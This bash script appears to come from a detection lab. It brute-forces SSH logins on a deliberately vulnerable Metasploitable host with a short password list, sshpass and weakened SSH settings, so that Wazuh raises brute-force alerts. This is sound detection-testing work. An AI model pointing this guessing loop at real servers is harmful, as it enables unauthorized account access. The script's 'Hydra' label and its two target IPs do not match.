#!/bin/bash
# SSH Brute Force Attack - MITRE ATT&CK T1110
# Generates authentication failure alerts in Wazuh

echo "=========================================="
echo "SSH Brute Force Attack (T1110)"
echo "=========================================="
echo ""

# Get Metasploitable IP
TARGET=$(getent hosts metasploitable | awk '{ print $1 }')
if [ -z "$TARGET" ]; then
    echo "❌ Error: Cannot resolve 'metasploitable' hostname"
    echo "Falling back to common Docker subnet..."
    TARGET="172.20.0.100"  # Fallback to common IP
fi

echo "🎯 Target: $TARGET"
echo "📋 Attack Type: SSH Brute Force"
echo "🔧 Tool: Hydra"
echo ""

# Create a small password list
echo "Creating password list..."
cat > /tmp/passwords.txt << EOF
admin
password
123456
root
test
msfadmin
EOF

echo "🚀 Starting SSH brute force attack..."
echo "⏱️  This will take about 30 seconds..."
echo ""

# Manual brute force with sshpass (more reliable for legacy SSH)
if ! command -v sshpass &> /dev/null; then
    apt-get update -qq && apt-get install -y sshpass -qq
fi

# Create SSH config for legacy algorithms (OpenSSH 9.0+ disabled these by default)
mkdir -p ~/.ssh
cat > ~/.ssh/config_legacy << 'EOF'
Host metasploitable
    HostName 172.20.0.5
    User msfadmin
    MACs hmac-sha1
    KexAlgorithms diffie-hellman-group1-sha1
    HostKeyAlgorithms ssh-rsa
    PubkeyAuthentication no
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
EOF

echo "[VERBOSE] Starting SSH brute force attempts..."
attempts=0
success=0

while IFS= read -r password; do
    ((attempts++))
    echo "[ATTEMPT] target $TARGET - login 'msfadmin' - pass '$password' - $attempts of 6"
    
    if sshpass -p "$password" ssh -F ~/.ssh/config_legacy metasploitable "exit" 2>/dev/null; then
        echo "[22][ssh] host: $TARGET   login: msfadmin   password: $password"
        success=1
        break
    fi
done < /tmp/passwords.txt

if [ $success -eq 1 ]; then
    echo ""
    echo "✓ 1 of 1 target successfully completed, 1 valid password found"
else
    echo ""
    echo "✗ No valid passwords found"
fi

echo ""
echo "✅ Attack completed!"
echo ""
echo "📊 Expected Wazuh Alerts:"
echo "  - Multiple authentication failures (Rule 5710)"
echo "  - Possible brute force attack (Rule 5712)"
echo "  - MITRE Technique: T1110 - Brute Force"
echo ""
echo "🔍 Check Wazuh Dashboard: https://localhost:443"
echo "   Navigate to: Security Events → Recent Alerts"
echo ""
echo "💡 Note: Successful login was: msfadmin/msfadmin"
